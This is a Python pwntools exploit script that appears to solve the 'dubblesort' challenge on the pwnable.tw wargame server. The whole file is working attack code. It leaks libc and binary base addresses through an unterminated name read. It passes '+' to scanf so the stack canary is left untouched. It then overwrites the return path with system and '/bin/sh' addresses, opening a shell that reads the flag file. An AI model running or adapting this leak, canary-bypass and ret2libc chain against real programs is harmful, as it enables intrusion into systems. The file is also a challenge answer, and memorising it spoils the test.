#!/usr/bin/env python3

from pwn import *

exe = ELF("./dubblesort_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x00000A1D
            brva 0x00000B17
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("chall.pwnable.tw", 10101)

# GDB()
p.sendafter(b'name :', b'a'*29)

# Leak stack
p.recvuntil(b'a'*29)
libc_leak = u32(b'a' + p.recv(3))
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x61 - 0x1b0000
print("Libc base: " + hex(libc.address))

# Leak exe
exe_leak = u32(p.recv(4))
exe.address = exe_leak - 0x601
print("Exe base: " + hex(exe.address))

num = 35
p.sendlineafter(b'sort :', str(num))
for i in range(24):
    p.sendlineafter(b'number :', str(1))
p.sendlineafter(b'number :', b'+') # 25

for i in range(8):
    p.sendlineafter(b'number :', str(libc.sym.system))
p.sendlineafter(b'number :', str(next(libc.search(b'/bin/sh'))))
p.sendlineafter(b'number :', str(next(libc.search(b'/bin/sh'))))
# GDB()
p.sendline(b'cat /home/dubblesort/flag')

p.interactive()